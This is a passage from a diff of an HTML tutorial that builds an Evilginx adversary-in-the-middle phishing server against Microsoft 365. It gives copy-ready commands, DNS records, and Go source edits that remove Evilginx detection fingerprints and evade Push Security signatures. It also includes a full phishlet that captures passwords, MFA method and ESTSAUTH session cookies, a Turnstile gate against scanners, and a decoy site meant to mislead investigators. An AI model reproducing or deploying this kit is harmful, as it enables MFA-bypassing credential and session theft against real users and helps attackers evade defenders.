+                <li><strong>Image:</strong> Ubuntu 24.04 LTS</li>
+                <li><strong>Size:</strong> 4 vCPU, 8 GB RAM, 160 GB SSD (Evilginx needs more resources)</li>
+                <li><strong>Region:</strong> Same as VPS 1</li>
+            </ul>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DeployingEvilginxDroplet.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DeployingEvilginxDroplet.png" alt="Deploying Evilginx Droplet">
+                </a>
+                <figcaption>Figure 45: Deploying the Evilginx VPS droplet on DigitalOcean.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 2.2 &mdash; Add DNS Records for VPS 2</h3>
+
+            <p>Back in Cloudflare, add A records pointing to VPS 2 IP. All must be <strong>DNS only (grey cloud)</strong>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> DNS Records</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>A    login.apex-corp.xyz         &rarr; VPS 2 IP</code>
+                    <code>A    auth-prod.apex-corp.xyz     &rarr; VPS 2 IP</code>
+                    <code>A    portal-prod.apex-corp.xyz   &rarr; VPS 2 IP</code>
+                    <code>A    uniquecdn.apex-corp.xyz     &rarr; VPS 2 IP</code>
+                    <code>A    sso-prod.apex-corp.xyz      &rarr; VPS 2 IP</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p><strong>Critical:</strong> <code>login.apex-corp.xyz</code> must be grey cloud (DNS only). If you orange-cloud it, Cloudflare terminates the TLS and the SNI passthrough to Evilginx breaks.</p>
+            </blockquote>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DnsRecordswithnewsubdomainpointnigtonewvps.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DnsRecordswithnewsubdomainpointnigtonewvps.png" alt="VPS 2 DNS Records">
+                </a>
+                <figcaption>Figure 46: DNS records for VPS 2 subdomains in Cloudflare.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 2.3 &mdash; Basic Setup on VPS 2</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt update && apt upgrade -y</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.4 &mdash; Install Go 1.22</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> curl -L https://go.dev/dl/go1.22.11.linux-amd64.tar.gz -o go.tar.gz</code>
+                    <code><span class="prompt">$</span> rm -rf /usr/local/go && tar -C /usr/local -xzf go.tar.gz</code>
+                    <code><span class="prompt">$</span> export PATH=$PATH:/usr/local/go/bin</code>
+                    <code><span class="prompt">$</span> echo 'export PATH=$PATH:/usr/local/go/bin' &gt;&gt; ~/.bashrc</code>
+                    <code><span class="prompt">$</span> go version</code>
+                </div>
+            </div>
+
+                        <hr>
+
+            <h3>Step 2.5 &mdash; Get a Wildcard SSL Certificate</h3>
+
+            <p>Evilginx needs a wildcard cert because it serves TLS for multiple subdomains (<code>auth-prod</code>, <code>sso-prod</code>, etc.). A regular single-domain cert won't cover them.</p>
+
+            <p>Wildcard certs require a DNS challenge &mdash; you can't use the default HTTP challenge for these:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install certbot -y</code>
+                    <code><span class="prompt">$</span> certbot certonly --manual --preferred-challenges=dns -d '*.apex-corp.xyz'</code>
+                </div>
+            </div>
+
+            <p>Certbot will give you a TXT record to add in Cloudflare:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/DNS-TXTrecordTOadd.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/DNS-TXTrecordTOadd.png" alt="DNS TXT Record">
+                </a>
+                <figcaption>Figure 47: DNS TXT record to add for wildcard certificate validation.</figcaption>
+            </figure>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/AddingTXTRecords.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/AddingTXTRecords.png" alt="Adding TXT Record">
+                </a>
+                <figcaption>Figure 48: Adding the TXT record in Cloudflare DNS.</figcaption>
+            </figure>
+
+            <p>After adding the TXT record, press Enter in the terminal. Certbot verifies it and saves the certificate.</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CertificateAndItsKeySaved.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CertificateAndItsKeySaved.png" alt="Certificate Saved">
+                </a>
+                <figcaption>Figure 49: Wildcard certificate and key saved successfully.</figcaption>
+            </figure>
+
+            <p>Copy the cert to the Evilginx directory:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> mkdir -p ~/.evilginx/crt/sites/o365</code>
+                    <code><span class="prompt">$</span> cp /etc/letsencrypt/archive/apex-corp.xyz/fullchain1.pem ~/.evilginx/crt/sites/o365/fullchain.pem</code>
+                    <code><span class="prompt">$</span> cp /etc/letsencrypt/archive/apex-corp.xyz/privkey1.pem ~/.evilginx/crt/sites/o365/privkey.pem</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.6 &mdash; Clone and Modify Evilginx Source</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> git clone https://github.com/kgretzky/evilginx2.git</code>
+                    <code><span class="prompt">$</span> cd evilginx2</code>
+                </div>
+            </div>
+
+            <blockquote>
+                <p><strong>Make ALL modifications BEFORE building.</strong> After you run <code>go build</code>, any source changes need a full rebuild to take effect.</p>
+            </blockquote>
+
+            <p>The reason these modifications matter &mdash; the default Evilginx build leaves fingerprints that defenders actively scan for. This is what the default config looks like:</p>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/EvilGinxConfigShowingDefaultCertificationHAvingBadCerts.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/EvilGinxConfigShowingDefaultCertificationHAvingBadCerts.png" alt="Default Evilginx Config">
+                </a>
+                <figcaption>Figure 50: Default Evilginx configuration showing detectable certificate fingerprints.</figcaption>
+            </figure>
+
+            <hr>
+
+            <p><strong>E1 &mdash; Remove the X-Evilginx IOC header</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code></p>
+
+            <p>Comment out these 3 locations:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>// Line ~469 &mdash; comment out:</code>
+                    <code>// req.Header.Set(p.getHomeDir(), o_host)</code>
+                    <code></code>
+                    <code>// Line ~659 &mdash; comment out:</code>
+                    <code>// req.Header.Set(p.getHomeDir(), o_host)</code>
+                    <code></code>
+                    <code>// Line ~1791-1793 &mdash; comment out the entire function:</code>
+                    <code>// func (p *HttpProxy) getHomeDir() string {</code>
+                    <code>//     return strings.Replace(HOME_DIR, &quot;.e&quot;, &quot;X-E&quot;, 1)</code>
+                    <code>// }</code>
+                </div>
+            </div>
+
+            <p>Without this change, every proxied response contains an <code>X-Evilginx</code> header revealing the tool.</p>
+
+            <hr>
+
+            <p><strong>E2 &mdash; Remove the HOME_DIR constant</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code> (~line 52)</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>// Comment out:</code>
+                    <code>// const (</code>
+                    <code>//     HOME_DIR = &quot;.evilginx&quot;</code>
+                    <code>// )</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <p><strong>E3 &mdash; Replace the unauthorized redirect HTML</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code></p>
+
+            <p>Search for <code>&lt;html&gt;</code> and replace with:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> HTML</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>&lt;html&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code>
+                </div>
+            </div>
+
+            <p>This is shown when someone accesses a path Evilginx does not recognise. The original content is identifiable.</p>
+
+            <hr>
+
+            <p><strong>E4 &mdash; Base64 obfuscation of HTML responses</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code> (~line 1154)</p>
+
+            <p>Add <code>"encoding/base64"</code> to the imports. At the end of the <code>if stringExists(mime, []string{"text/html"})</code> block, before the closing brace:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>encodedBody := base64.StdEncoding.EncodeToString(body)</code>
+                    <code>body = []byte(fmt.Sprintf(&quot;&lt;script&gt;document.write(decodeURIComponent(atob('%s')));&lt;/script&gt;&quot;, encodedBody))</code>
+                </div>
+            </div>
+
+            <p>The browser decodes and renders it normally. Security scanners reading raw HTML see nothing useful.</p>
+
+            <hr>
+
+            <p><strong>E5 &mdash; Dynamic JS minification</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code> &mdash; find the <code>injectJavascriptIntoBody</code> function.</p>
+
+            <p>Add imports:</p>
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>"github.com/tdewolff/minify"</code>
+                    <code>"github.com/tdewolff/minify/js"</code>
+                </div>
+            </div>
+
+            <p>Replace the injection logic:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>re := regexp.MustCompile(`(?i)(&lt;\s*/body\s*&gt;)`)</code>
+                    <code>var d_inject string</code>
+                    <code></code>
+                    <code>if script != "" {</code>
+                    <code>    minifier := minify.New()</code>
+                    <code>    minifier.AddFunc("text/javascript", js.Minify)</code>
+                    <code>    obfuscatedScript, err := minifier.String("text/javascript", script)</code>
+                    <code>    if err != nil {</code>
+                    <code>        d_inject = "&lt;script" + js_nonce + "&gt;" + "function doNothing() {var x =0};" + script + "&lt;/script&gt;\n${1}"</code>
+                    <code>    }</code>
+                    <code>    d_inject = "&lt;script" + js_nonce + "&gt;" + "function doNothing() {var x =0};" + obfuscatedScript + "&lt;/script&gt;\n${1}"</code>
+                    <code>} else if src_url != "" {</code>
+                    <code>    d_inject = "&lt;script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"&gt;&lt;/script&gt;\n${1}"</code>
+                    <code>} else {</code>
+                    <code>    return body</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p>This minifies injected JavaScript so it does not match static signatures security tools look for.</p>
+
+            <hr>
+
+            <p><strong>E6-E7 &mdash; Custom TLS configuration</strong></p>
+
+            <p>File: <code>core/config.go</code></p>
+
+            <p>Add <code>"crypto/tls"</code> to imports. Add to the <code>GeneralConfig</code> struct:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>CipherSuites   []uint16 `mapstructure:"cipher_suites" json:"cipher_suites" yaml:"cipher_suites"`</code>
+                    <code>TLSMinVersion  uint16   `mapstructure:"tls_min_version" json:"tls_min_version" yaml:"tls_min_version"`</code>
+                    <code>TLSMaxVersion  uint16   `mapstructure:"tls_max_version" json:"tls_max_version" yaml:"tls_max_version"`</code>
+                </div>
+            </div>
+
+            <p>In <code>NewConfig()</code>, add:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>c.general.CipherSuites = []uint16{</code>
+                    <code>    tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,</code>
+                    <code>    tls.TLS_RSA_WITH_AES_128_GCM_SHA256,</code>
+                    <code>}</code>
+                    <code>c.general.TLSMinVersion = tls.VersionTLS12</code>
+                    <code>c.general.TLSMaxVersion = tls.VersionTLS12</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <p><strong>E8 &mdash; Replace TLSConfigFromCA</strong></p>
+
+            <p>File: <code>core/http_proxy.go</code> &mdash; replace the entire <code>TLSConfigFromCA</code> function:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {</code>
+                    <code>    return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {</code>
+                    <code>        parts := strings.SplitN(host, ":", 2)</code>
+                    <code>        hostname := parts[0]</code>
+                    <code>        port := 443</code>
+                    <code>        if len(parts) == 2 {</code>
+                    <code>            port, _ = strconv.Atoi(parts[1])</code>
+                    <code>        }</code>
+                    <code></code>
+                    <code>        tls_cfg := &amp;tls.Config{</code>
+                    <code>            CipherSuites:             p.cfg.general.CipherSuites,</code>
+                    <code>            PreferServerCipherSuites: false,</code>
+                    <code>            MinVersion:               p.cfg.general.TLSMinVersion,</code>
+                    <code>            MaxVersion:               p.cfg.general.TLSMaxVersion,</code>
+                    <code>        }</code>
+                    <code></code>
+                    <code>        if !p.developer {</code>
+                    <code>            tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate</code>
+                    <code>            tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol}</code>
+                    <code>            return tls_cfg, nil</code>
+                    <code>        } else {</code>
+                    <code>            var ok bool</code>
+                    <code>            phish_host := ""</code>
+                    <code>            if !p.cfg.IsLureHostnameValid(hostname) {</code>
+                    <code>                phish_host, ok = p.replaceHostWithPhished(hostname)</code>
+                    <code>                if !ok {</code>
+                    <code>                    log.Debug("phishing hostname not found: %s", hostname)</code>
+                    <code>                    return nil, fmt.Errorf("phishing hostname not found")</code>
+                    <code>                }</code>
+                    <code>            }</code>
+                    <code>            cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)</code>
+                    <code>            if err != nil {</code>
+                    <code>                log.Error("http_proxy: %s", err)</code>
+                    <code>                return nil, err</code>
+                    <code>            }</code>
+                    <code>            return &amp;tls.Config{</code>
+                    <code>                InsecureSkipVerify:       true,</code>
+                    <code>                Certificates:             []tls.Certificate{*cert},</code>
+                    <code>                CipherSuites:             p.cfg.general.CipherSuites,</code>
+                    <code>                PreferServerCipherSuites: false,</code>
+                    <code>                MinVersion:               p.cfg.general.TLSMinVersion,</code>
+                    <code>                MaxVersion:               p.cfg.general.TLSMaxVersion,</code>
+                    <code>            }, nil</code>
+                    <code>        }</code>
+                    <code>    }</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <p><strong>E9 &mdash; Fix the cookie name format</strong></p>
+
+            <p>The default Evilginx cookie name has an <code>xxxx-xxxx</code> pattern that Push Security detects automatically.</p>
+
+            <p>File: <code>core/http_proxy.go</code> &mdash; replace <code>getSessionCookieName</code>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>func getSessionCookieName(pl_name string, cookie_name string) string {</code>
+                    <code>    hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))</code>
+                    <code>    s_hash := fmt.Sprintf("%x", hash[:6])</code>
+                    <code>    return s_hash</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <p>This removes the <code>xxxx-xxxx</code> pattern that is used as a detection signature.</p>
+
+            <hr>
+
+            <p><strong>E10 &mdash; Fix the cookie value format</strong></p>
+
+            <p>The default token is 64 hex characters &mdash; another Push Security signature.</p>
+
+            <p>File: <code>core/utils.go</code> &mdash; replace <code>GenRandomToken</code>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>func GenRandomToken() string {</code>
+                    <code>    rdata := make([]byte, 64)</code>
+                    <code>    rand.Read(rdata)</code>
+                    <code>    hash := sha256.Sum256(rdata)</code>
+                    <code>    token := fmt.Sprintf("%x", hash)</code>
+                    <code>    return token[:8] + "-" + token[8:16] + "-" + token[16:24] + "-" + token[24:32]</code>
+                    <code>}</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <p><strong>E11 &mdash; Modify cert.db</strong></p>
+
+            <p>File: <code>core/cert.db</code></p>
+
+            <p>Change the Organisation and Country fields to something that looks like a normal CDN or cloud provider, not obviously Evilginx.</p>
+
+            <hr>
+
+            <p><strong>E18 &mdash; Increase lure URL randomness</strong></p>
+
+            <p>File: <code>core/terminal.go</code> (~line 728):</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> Go</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>Path: "/" + GenRandomString(16),   // was 8 chars by default</code>
+                </div>
+            </div>
+
+            <p>Longer paths are harder to guess or brute-force.</p>
+
+                        <hr>
+
+            <h3>Step 2.7 &mdash; Create the Custom O365 Phishlet</h3>
+
+            <p>Create the file <code>phishlets/o365.yaml</code>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> nano phishlets/o365.yaml</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> phishlets/o365.yaml</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>name: 'Microsoft 365'</code>
+                    <code>author: 'Custom'</code>
+                    <code>min_ver: '3.1.0'</code>
+                    <code>proxy_hosts:</code>
+                    <code>  - {phish_sub: 'auth-prod',   orig_sub: 'login',  domain: 'microsoftonline.com', session: true,  is_landing: true,  auto_filter: true}</code>
+                    <code>  - {phish_sub: 'portal-prod', orig_sub: 'www',    domain: 'office.com',          session: false, is_landing: false, auto_filter: true}</code>
+                    <code>  - {phish_sub: 'uniquecdn',   orig_sub: 'login',  domain: 'microsoft.com',       session: false, is_landing: false, auto_filter: true}</code>
+                    <code>  - {phish_sub: 'sso-prod',    orig_sub: 'login',  domain: 'live.com',            session: false, is_landing: false, auto_filter: true}</code>
+                    <code>auth_tokens:</code>
+                    <code>  - domain: '.login.microsoftonline.com'</code>
+                    <code>    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']</code>
+                    <code>    type: 'cookie'</code>
+                    <code>credentials:</code>
+                    <code>  username:</code>
+                    <code>    key: '(login|UserName)'</code>
+                    <code>    search: '(.*)'</code>
+                    <code>    type: 'post'</code>
+                    <code>  password:</code>
+                    <code>    key: '(passwd|Password|accesspass)'</code>
+                    <code>    search: '(.*)'</code>
+                    <code>    type: 'post'</code>
+                    <code>  custom:</code>
+                    <code>    - key: 'mfaAuthMethod'</code>
+                    <code>      search: '(.*)'</code>
+                    <code>      type: 'post'</code>
+                    <code>login:</code>
+                    <code>  domain: 'login.microsoftonline.com'</code>
+                    <code>  path: '/'</code>
+                    <code>js_inject:</code>
+                    <code>  - trigger_domains: ["login.microsoftonline.com"]</code>
+                    <code>    trigger_paths: ["*"]</code>
+                    <code>    script: |</code>
+                    <code>      function modifyUI() {</code>
+                    <code>          document.title = 'Apex Corp - Secure Login';</code>
+                    <code>          const customIcon = "https://cdn.apex-corp.xyz/favicon.ico";</code>
+                    <code>          setInterval(() => {</code>
+                    <code>              let favicon = document.querySelector('link[rel="shortcut icon"], link[rel="icon"]');</code>
+                    <code>              if (favicon && favicon.href !== customIcon) { favicon.href = customIcon; }</code>
+                    <code>          }, 500);</code>
+                    <code>      }</code>
+                    <code>      document.addEventListener('DOMContentLoaded', modifyUI);</code>
+                    <code>sub_filters:</code>
+                    <code>  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'auth-prod', domain: 'apex-corp.xyz', search: 'Sign in to your account', replace: 'Verify your identity', mimes: ['text/html']}</code>
+                    <code>  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'auth-prod', domain: 'apex-corp.xyz', search: 'https://telemetry.microsoft.com', replace: 'https://{hostname}/null', mimes: ['text/html', 'application/javascript']}</code>
+                </div>
+            </div>
+
+            <p><strong>Why these <code>phish_sub</code> values?</strong></p>
+
+            <p>Names like <code>auth-prod</code>, <code>portal-prod</code>, <code>uniquecdn</code>, <code>sso-prod</code> look like real production infrastructure subdomains. Never use default names like <code>login</code>, <code>auth</code>, or <code>secure</code> &mdash; those are immediately flagged by detection tools.</p>
+
+            <p>Each <code>phish_sub</code> needs a corresponding DNS A record pointing to VPS 2 (grey cloud in Cloudflare).</p>
+
+            <p>The <code>js_inject</code> block changes the page title and favicon live, so the victim sees "Apex Corp - Secure Login" instead of the Microsoft default.</p>
+
+            <p>The <code>sub_filters</code> block replaces "Sign in to your account" with "Verify your identity" and kills Microsoft's telemetry endpoint so it cannot report the phishing page back home.</p>
+
+            <hr>
+
+            <h3>Step 2.8 &mdash; Build Evilginx</h3>
+
+            <p>After all modifications are done:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> cd evilginx2</code>
+                    <code><span class="prompt">$</span> go build .</code>
+                    <code><span class="prompt">$</span> chmod +x evilginx</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.9 &mdash; Set Up the Turnstile Redirector</h3>
+
+            <p>Cloudflare Turnstile is an invisible CAPTCHA that sits in front of the lure URL. It blocks bots and automated scanners. Only real browsers that pass the challenge get forwarded to Evilginx.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> mkdir -p redirectors/turnstile</code>
+                    <code><span class="prompt">$</span> nano redirectors/turnstile/index.html</code>
+                </div>
+            </div>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> redirectors/turnstile/index.html</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>&lt;html&gt;</code>
+                    <code>&lt;head&gt;</code>
+                    <code>  &lt;title&gt;...&lt;/title&gt;</code>
+                    <code>  &lt;script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"&gt;&lt;/script&gt;</code>
+                    <code>&lt;/head&gt;</code>
+                    <code>&lt;body&gt;</code>
+                    <code>  Loading...</code>
+                    <code>  &lt;div id="cf-turnstile"&gt;&lt;/div&gt;</code>
+                    <code>  &lt;script&gt;</code>
+                    <code>    turnstile.ready(function () {</code>
+                    <code>        turnstile.render('#cf-turnstile', {</code>
+                    <code>            sitekey: 'YOUR_TURNSTILE_SITE_KEY',</code>
+                    <code>            callback: function(token) {</code>
+                    <code>                window.location.assign({lure_url_js});</code>
+                    <code>            },</code>
+                    <code>        });</code>
+                    <code>    });</code>
+                    <code>  &lt;/script&gt;</code>
+                    <code>&lt;/body&gt;</code>
+                    <code>&lt;/html&gt;</code>
+                </div>
+            </div>
+
+            <p>To get your site key:</p>
+            <ol>
+                <li>Go to Cloudflare Dashboard &rarr; Turnstile</li>
+                <li>Add site &mdash; domain = <code>login.apex-corp.xyz</code>, Widget Mode = Invisible</li>
+                <li>Copy the Site Key and replace <code>YOUR_TURNSTILE_SITE_KEY</code></li>
+            </ol>
+
+            <figure>
+                <a href="/articles/evilginx-gophish/assets/CloudflareTurnstile.png" class="image-popup">
+                    <img src="/articles/evilginx-gophish/assets/CloudflareTurnstile.png" alt="Cloudflare Turnstile">
+                </a>
+                <figcaption>Figure 51: Cloudflare Turnstile configuration.</figcaption>
+            </figure>
+
+            <hr>
+
+            <h3>Step 2.10 &mdash; Install Caddy on VPS 2</h3>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> apt install -y debian-keyring debian-archive-keyring apt-transport-https curl</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg</code>
+                    <code><span class="prompt">$</span> curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | tee /etc/apt/sources.list.d/caddy-stable.list</code>
+                    <code><span class="prompt">$</span> apt update && apt install caddy -y</code>
+                    <code><span class="prompt">$</span> systemctl stop caddy</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h3>Step 2.11 &mdash; Create the Decoy Site</h3>
+
+            <p>Everyone who visits the domain without a valid token should see a normal-looking corporate website. This fools bots, scanners, and anyone trying to investigate.</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">$</span> mkdir -p /var/www/decoy</code>
+                    <code><span class="prompt">$</span> chown -R caddy:caddy /var/www/decoy</code>
+                </div>
+            </div>
+
+            <p><code>/var/www/decoy/index.html</code>:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-code"></i> HTML</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code>&lt;!DOCTYPE html&gt;</code>
+                    <code>&lt;html lang="en"&gt;</code>
+                    <code>&lt;head&gt;</code>
+                    <code>    &lt;meta charset="UTF-8"&gt;</code>
+                    <code>    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</code>
+                    <code>    &lt;title&gt;Apex Corp &mdash; Digital Transformation&lt;/title&gt;</code>
+                    <code>    &lt;style&gt;</code>
+                    <code>        * { margin:0; padding:0; box-sizing:border-box; }</code>
+                    <code>        body {</code>
+                    <code>            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;</code>
+                    <code>            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);</code>
+                    <code>            color: #fff; min-height: 100vh;</code>
+                    <code>            display: flex; align-items: center; justify-content: center;</code>
+                    <code>        }</code>
+                    <code>        .container { text-align: center; padding: 2rem; max-width: 600px; }</code>
+                    <code>        .logo { font-size: 2.5rem; font-weight: 800; letter-spacing: 4px; color: #e2a616; }</code>
+                    <code>        h1 { font-size: 2rem; margin: 1rem 0; }</code>
+                    <code>        p { color: #a0a0c0; line-height: 1.6; margin-bottom: 2rem; }</code>
+                    <code>        .btn { padding: 12px 32px; border-radius: 6px; background: #e2a616;</code>
+                    <code>               color: #0a0a0a; text-decoration: none; font-weight: 600; }</code>
+                    <code>        .footer { margin-top: 3rem; font-size: 0.8rem; color: #556; }</code>
+                    <code>    &lt;/style&gt;</code>
+                    <code>&lt;/head&gt;</code>
+                    <code>&lt;body&gt;</code>
+                    <code>    &lt;div class="container"&gt;</code>
